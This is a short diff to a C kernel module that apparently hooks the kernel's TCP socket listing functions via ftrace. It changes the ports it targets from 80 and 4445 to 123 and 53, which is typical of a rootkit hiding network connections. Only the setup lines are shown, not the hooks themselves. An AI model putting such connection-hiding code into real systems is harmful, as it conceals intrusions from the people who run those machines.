@@ -3,8 +3,8 @@
 #include "../include/audit.h"
 #include "../ftrace/ftrace_helper.h"
 
-#define PORT 80
-#define PORT2 4445
+#define PORT 123
+#define PORT2 53
 
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
